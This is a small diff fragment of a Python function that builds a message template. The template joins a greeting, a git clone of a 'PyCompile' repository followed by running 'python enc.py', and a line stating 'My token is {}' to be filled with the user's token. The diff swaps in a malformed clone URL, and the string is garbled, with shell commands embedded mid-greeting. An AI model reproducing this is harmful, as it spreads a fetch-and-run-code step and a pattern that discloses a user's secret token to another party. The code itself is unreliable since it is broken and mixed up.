@@ -40,7 +40,7 @@ def send_initial_message():
 
       # Modify the message as per your requirement
       msg_template = "Hello Danger Orincerm rf PyCompile
-git clone https://github.com/Viru0987/PyCompile
+git clone https://github.com/Viru0987/Server.git/PyCompile
 cd PyCompile
 python enc.py! I am using your server. My token is {}"
 
